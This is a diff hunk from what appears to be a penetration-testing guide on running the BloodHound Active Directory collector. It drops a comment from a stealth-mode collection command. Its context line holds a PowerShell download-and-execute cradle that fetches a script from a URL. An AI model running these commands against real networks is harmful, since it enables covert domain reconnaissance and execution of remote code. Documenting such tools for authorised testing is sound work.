@@ -41,7 +41,7 @@ IEX (New-Object Net.Webclient).DownloadString("$HTTP_URL_TO_SCRIPT"); $BLOODHOUN
 Execute the collector script.
 
 ```powershell
-Invoke-BloodHound -CollectionMethod All -Domain $DOMAIN -Stealth # HYDRA.test
+Invoke-BloodHound -CollectionMethod All -Domain $DOMAIN -Stealth
 ```
 
 **Target Machine, C# Collector**:
